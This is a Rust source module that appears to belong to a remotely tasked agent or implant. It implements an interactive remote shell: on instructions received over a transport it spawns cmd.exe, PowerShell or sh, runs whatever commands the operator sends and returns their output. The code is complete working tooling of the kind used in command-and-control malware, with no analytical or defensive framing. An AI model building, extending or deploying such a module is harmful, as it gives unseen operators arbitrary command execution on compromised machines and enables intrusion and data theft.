#![allow(dead_code)]
// Interactive shell session: ISHELL_OPEN / ISHELL_RUN / ISHELL_CLOSE

use std::io::{BufRead, BufReader, Write};
use std::process::{Child, ChildStdin, Command, Stdio};
use std::sync::{Mutex, OnceLock};
use std::time::Duration;

use crate::transport::{AgentTransport, TaskWire};

const EOC_PREFIX: &str = "__SHLEOF__";

struct IShellSession {
    child: Child,
    stdin: ChildStdin,
    // Lines are pushed into this buffer by a background reader thread
    lines: std::sync::Arc<Mutex<Vec<String>>>,
}

static SESSION: OnceLock<Mutex<Option<IShellSession>>> = OnceLock::new();

fn session_lock() -> &'static Mutex<Option<IShellSession>> {
    SESSION.get_or_init(|| Mutex::new(None))
}

fn make_shell_cmd(shell: &str) -> Command {
    #[cfg(target_os = "windows")]
    {
        if shell == "ps" || shell == "powershell" {
            let mut c = Command::new("powershell.exe");
            c.args(["-NoLogo", "-NoProfile", "-NonInteractive"]);
            c
        } else {
            let mut c = Command::new("cmd.exe");
            c.args(["/Q"]);
            c
        }
    }
    #[cfg(not(target_os = "windows"))]
    {
        let _ = shell;
        Command::new("sh")
    }
}

fn ishell_open(shell: &str) -> Result<(), String> {
    let mut guard = session_lock().lock().unwrap();

    // Kill any existing session
    if let Some(ref mut sess) = *guard {
        let _ = sess.child.kill();
        let _ = sess.child.wait();
    }
    *guard = None;

    let mut cmd = make_shell_cmd(shell);

    cmd.stdin(Stdio::piped())
       .stdout(Stdio::piped())
       .stderr(Stdio::piped());

    let mut child = cmd.spawn().map_err(|e| format!("spawn failed: {e}"))?;

    let stdin  = child.stdin.take().ok_or("no stdin")?;
    let stdout = child.stdout.take().ok_or("no stdout")?;
    let stderr = child.stderr.take().ok_or("no stderr")?;

    let lines_arc: std::sync::Arc<Mutex<Vec<String>>> = std::sync::Arc::new(Mutex::new(Vec::new()));

    // Spawn reader threads for stdout and stderr
    {
        let lc = std::sync::Arc::clone(&lines_arc);
        std::thread::spawn(move || {
            for line in BufReader::new(stdout).lines().flatten() {
                lc.lock().unwrap().push(line);
            }
        });
    }
    {
        let lc = std::sync::Arc::clone(&lines_arc);
        std::thread::spawn(move || {
            for line in BufReader::new(stderr).lines().flatten() {
                lc.lock().unwrap().push(line);
            }
        });
    }

    *guard = Some(IShellSession { child, stdin, lines: lines_arc });
    Ok(())
}

fn ishell_run(cmd_line: &str, timeout_ms: u64) -> Result<String, String> {
    let mut guard = session_lock().lock().unwrap();
    let sess = guard.as_mut().ok_or("no active shell — use ISHELL_OPEN first")?;

    // Unique marker to detect end of command output
    let marker = format!("{EOC_PREFIX}_{}", std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH).unwrap_or_default().as_nanos());

    // Write command + echo marker to stdin
    writeln!(sess.stdin, "{cmd_line}").map_err(|e| format!("stdin write: {e}"))?;
    writeln!(sess.stdin, "echo {marker}").map_err(|e| format!("stdin write: {e}"))?;
    sess.stdin.flush().ok();

    // Snapshot the current line index so we only read new output
    let start_idx = sess.lines.lock().unwrap().len();
    let lines_ref = std::sync::Arc::clone(&sess.lines);

    // Drop the session guard so reader threads can push new lines
    drop(guard);

    let deadline = std::time::Instant::now() + Duration::from_millis(timeout_ms);
    let mut output_lines: Vec<String> = Vec::new();
    let mut found_marker = false;

    while std::time::Instant::now() < deadline {
        {
            let buf = lines_ref.lock().unwrap();
            let new_lines = &buf[start_idx.min(buf.len())..];
            for line in new_lines {
                if line.contains(&marker) {
                    found_marker = true;
                    break;
                }
                output_lines.push(line.clone());
            }
        }
        if found_marker { break; }
        std::thread::sleep(Duration::from_millis(50));
    }

    if !found_marker {
        return Err(format!("timeout waiting for shell output ({}ms)", timeout_ms));
    }
    Ok(output_lines.join("\n"))
}

fn ishell_close() {
    let mut guard = session_lock().lock().unwrap();
    if let Some(ref mut sess) = *guard {
        let _ = sess.child.kill();
        let _ = sess.child.wait();
    }
    *guard = None;
}

pub fn dispatch(t: &mut AgentTransport, task: &TaskWire) -> bool {
    let typ = task.typ.to_uppercase();
    match typ.as_str() {
        "ISHELL_OPEN" => {
            let shell = if task.args.is_empty() { "cmd" } else { task.args.trim() };
            match ishell_open(shell) {
                Ok(())   => t.send_result(task.id, &format!("[+] shell opened: {shell}"), ""),
                Err(e)   => t.send_result(task.id, "", &e),
            }
            true
        }

        "ISHELL_RUN" => {
            let result = ishell_run(&task.args, 30_000);
            match result {
                Ok(out)  => t.send_result(task.id, &out, ""),
                Err(e)   => t.send_result(task.id, "", &e),
            }
            true
        }

        "ISHELL_CLOSE" => {
            ishell_close();
            t.send_result(task.id, "[+] shell closed", "");
            true
        }

        _ => false,
    }
}
